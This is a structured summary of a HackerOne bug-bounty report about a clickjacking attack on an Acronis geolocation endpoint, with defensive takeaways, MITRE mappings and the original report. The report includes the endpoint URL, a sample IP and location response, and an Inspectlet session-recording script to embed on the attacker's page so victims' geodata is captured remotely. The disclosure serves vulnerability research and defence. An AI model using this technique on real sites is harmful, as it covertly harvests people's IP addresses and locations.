# User IP and Geolocation Disclosure via Clickjacking with Session Recording

## Metadata
- **Source:** HackerOne
- **Report:** 998555 | https://hackerone.com/reports/998555
- **Submitted:** 2020-10-05
- **Reporter:** abosala7
- **Program:** Acronis
- **Bounty:** Not specified
- **Severity:** Medium
- **Vuln:** Clickjacking, Information Disclosure, Insufficient UI Redressing Protection, Session Recording Abuse
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can create a clickjacking page that tricks users into interacting with a vulnerable geoAPI endpoint, combined with third-party session recording technology (Inspectlet) to capture and exfiltrate user IP addresses and precise geolocation data. The vulnerability leverages the absence of clickjacking protections (X-Frame-Options, CSP) on the geoAPI endpoint.

## Attack scenario
1. Attacker discovers that geoapi.acronis.com exposes geolocation data via an unauthenticated endpoint
2. Attacker creates a malicious webpage with hidden iframe pointing to the vulnerable endpoint
3. Attacker registers with Inspectlet session recording service and embeds tracking code on the malicious page
4. Attacker tricks victims to visit the page via social engineering, phishing, or embedded iframes on legitimate sites
5. Victim unknowingly interacts with the hidden iframe, triggering the geoAPI request
6. Inspectlet session recording captures the victim's geolocation data, IP address, and session details; attacker retrieves this via Inspectlet dashboard

## Root cause
The geoAPI endpoint lacks clickjacking defenses (missing X-Frame-Options header and insufficient CSP), allowing it to be embedded in iframes. Additionally, the endpoint returns sensitive geolocation and IP data without proper access controls or user consent mechanisms.

## Attacker mindset
The attacker views third-party session recording as an amplification vector for data exfiltration. By combining clickjacking with freely-available recording tools, they can passively harvest geolocation data at scale without sophisticated infrastructure. This represents a 'low effort, high reward' attack combining multiple vectors.

## Defensive takeaways
- Implement X-Frame-Options: DENY header to prevent framing of sensitive endpoints
- Deploy Content Security Policy (CSP) with frame-ancestors directive
- Require authentication and authorization for geolocation API endpoints
- Implement rate limiting and anomaly detection on geoAPI requests
- Add user-agent validation to detect automated or unexpected requests
- Consider geofencing or IP reputation checks to flag suspicious access patterns
- Implement Subresource Integrity (SRI) for third-party scripts to prevent malicious injections
- Monitor and log all geolocation data access with IP and user context
- Educate users about session recording risks on untrusted websites

## Variant hunting
Look for other Acronis endpoints lacking clickjacking protections; examine whether other cloud providers' geoAPI services have similar framing vulnerabilities; test if sensitive data endpoints (user info, admin panels) are similarly exploitable via clickjacking combined with screen recording tools

## MITRE ATT&CK
- T1189
- T1598
- T1566
- T1040
- T1020

## Notes
The writeup demonstrates practical abuse of legitimate third-party services (Inspectlet) as force-multipliers in attacks. The vulnerability chain is relatively unsophisticated but effective. The reporter did not provide evidence of successful exploitation or impact metrics. The geoAPI endpoint URL pattern (ajax/autocomplete/user) suggests it may be part of admin functionality, raising questions about why it was exposed without authentication.

## Full report
<details><summary>Expand</summary>

## Summary
Get ip and Geo location any user via Clickjacking with inspectlet technology

https://geoapi.acronis.com/?q=admin/views/ajax/autocomplete/user/a

## Steps To Reproduce
  1. go to F1015419
  2. will watch your geo data ex.
{"city":"Abu Kabir","country":{"name":"Egypt","code":"EG"},"location":{"accuracy_radius":1000,"latitude":30.7251,"longitude":31.6715,"time_zone":"Africa\/Cairo"},"region":{"name":"Sharqia","code":"SHR"},"ip":"154.237.109.156"}

  3.upload this page to any host and regsiter on https://www.inspectlet.com and add the tarcking code  to your clickjacking page to can screen recording the user Sessions

ex.
<!-- Begin Inspectlet Asynchronous Code -->
<script type="text/javascript">
(function() {
window.__insp = window.__insp || [];
__insp.push(['wid', 2060137667]);
var ldinsp = function(){
if(typeof window.__inspld != "undefined") return; window.__inspld = 1; var insp = document.createElement('script'); insp.type = 'text/javascript'; insp.async = true; insp.id = "inspsync"; insp.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://cdn.inspectlet.com/inspectlet.js?wid=2060137667&r=' + Math.floor(new Date().getTime()/3600000); var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(insp, x); };
setTimeout(ldinsp, 0);
})();
</script>
<!-- End Inspectlet Asynchronous Code -->

  4. after victim going to clickjacking page attacker will get full geo data via  Session Recordings tab  on https://www.inspectlet.com

## Impact

Get ip and Geo location any user

</details>

---
*Analysed by Claude on 2026-05-24*
